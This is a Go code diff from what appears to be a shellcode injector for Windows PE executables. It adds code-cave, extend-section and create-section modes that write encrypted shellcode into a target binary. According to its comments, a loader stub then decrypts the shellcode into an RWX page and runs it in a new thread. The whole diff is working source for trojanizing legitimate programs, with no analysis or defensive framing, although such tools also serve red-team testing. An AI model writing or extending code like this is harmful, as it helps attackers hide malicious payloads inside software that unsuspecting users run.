@@ -14,6 +14,9 @@ import (
 	"github.com/For-ACGN/go-keystone"
 )
 
+// just for prevent [import _ "embed"] :)
+var _ embed.FS
+
 // mov eax, 0x11223344     mov rax, 0x1122334455667788
 // xor eax, ebx            xor rax, rbx
 // mov [edi], eax          mov [rdi], rax
@@ -25,8 +28,10 @@ const (
 	maxNumLoaderInstX64 = 250
 )
 
-// just for prevent [import _ "embed"] :)
-var _ embed.FS
+const (
+	defaultSectionName = ".patch"
+	reservedLoaderSize = 4096
+)
 
 // The role of the shellcode loader is used to decrypt shellcode
 // in the tail section to a new RWX page, then create thread at
@@ -103,12 +108,14 @@ type loaderCtx struct {
 	CreateThread   uint64
 
 	// information of write shellcode
-	SectionMode   bool
-	SectionOffset uint32
-	EntryOffset   int
-	MemRegionSize int
-	ShellcodeSize int
-	ShellcodeKey  interface{}
+	CodeCave        bool
+	ExtendSection   bool
+	CreateSection   bool
+	EntryOffset     int
+	MemRegionSize   int
+	ShellcodeOffset uint32
+	ShellcodeSize   int
+	ShellcodeKey    interface{}
 }
 
 func (inj *Injector) buildLoader(shellcode []byte) ([]byte, error) {
@@ -436,7 +443,7 @@ func (inj *Injector) buildLoaderSource(ctx *loaderCtx, sc []byte, src string) (s
 		if inj.opts.ForceExtendSection {
 			return "", errors.New("not enough code caves for force extend section mode")
 		}
-		return inj.useCreateSectionMode(ctx, sc, src), nil
+		return inj.useCreateSectionMode(ctx, sc, src)
 	}
 	if inj.opts.ForceExtendSection {
 		return inj.useExtendSectionMode(ctx, sc, src), nil
@@ -492,11 +499,38 @@ func (inj *Injector) useCodeCaveMode(ctx *loaderCtx, sc []byte, src string) stri
 			stub += "\r\n"
 		}
 	}
+	ctx.CodeCave = true
 	// replace the flag to assembly source
 	return strings.ReplaceAll(src, "{{STUB CodeCaveMode STUB}}", stub)
 }
 
 func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte, src string) string {
+	shellcode := inj.encryptShellcode(ctx, sc)
+	offset := inj.extendSection(shellcode)
+	ctx.ExtendSection = true
+	ctx.ShellcodeOffset = offset
+	// remove the flag in assembly source
+	return strings.ReplaceAll(src, "{{STUB CodeCaveMode STUB}}", "")
+}
+
+func (inj *Injector) useCreateSectionMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
+	shellcode := inj.encryptShellcode(ctx, sc)
+	name := inj.opts.SectionName
+	if name == "" {
+		name = defaultSectionName
+	}
+	section, err := inj.createSection(name, reservedLoaderSize+uint32(len(shellcode)))
+	if err != nil {
+		return "", err
+	}
+	inj.section = section
+	ctx.CreateSection = true
+	ctx.ShellcodeOffset = section.VirtualAddress + reservedLoaderSize
+	// remove the flag in assembly source
+	return strings.ReplaceAll(src, "{{STUB CodeCaveMode STUB}}", ""), nil
+}
+
+func (inj *Injector) encryptShellcode(ctx *loaderCtx, sc []byte) []byte {
 	// encrypt shellcode
 	encrypted := make([]byte, len(sc))
 	switch inj.arch {
@@ -544,16 +578,7 @@ func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte, src string)
 			}
 		}
 	}
-	ctx.SectionMode = true
-	ctx.SectionOffset = inj.extendSection(section.Bytes())
-	// remove the flag in assembly source
-	return strings.ReplaceAll(src, "{{STUB CodeCaveMode STUB}}", "")
-}
-
-func (inj *Injector) useCreateSectionMode(ctx *loaderCtx, sc []byte, src string) string {
-
-	// remove the flag in assembly source
-	return strings.ReplaceAll(src, "{{STUB CodeCaveMode STUB}}", "")
+	return section.Bytes()
 }
 
 func xorShift32(seed uint32) uint32 {
